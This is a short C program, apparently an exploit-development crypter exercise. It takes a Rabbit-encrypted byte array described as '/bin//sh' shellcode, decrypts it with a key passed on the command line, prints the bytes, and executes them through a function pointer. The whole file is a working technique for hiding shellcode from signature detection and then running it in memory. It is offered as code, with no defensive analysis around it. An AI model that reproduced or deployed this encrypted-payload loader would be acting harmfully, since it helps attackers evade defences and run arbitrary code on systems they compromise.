#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include "rabbit.h"

#define KEY_LEN 16

int main(int argc, char *argv[])
{

    byte key[KEY_LEN];
    int i, flag, s;
    t_instance state, state2;

    //Shellcode of /bin//sh
    unsigned char encrypted_shellcode[] = "\xe8\x27\x40\x48\x86\xb8\xd4\x2f\x40\xbf\x78\x0b\x1d\xae\xa4\x34\xad\xda\x8d\xca\xf7\x43\xa5\x3d\x40\x0b";
    int const LEN=sizeof(encrypted_shellcode);

    byte decrypted_shellcode[LEN];

    //Decryption
    check_init_key(argv[1],key);
    key_setup(&state, key);
    cipher(&state, encrypted_shellcode, decrypted_shellcode, sizeof(encrypted_shellcode));


    for (i=0;i<sizeof(encrypted_shellcode);i++)
        printf("\\x%02x", decrypted_shellcode[i]);
    printf("\n");

    int (*ret)() = (int(*)())decrypted_shellcode;
	ret();
}
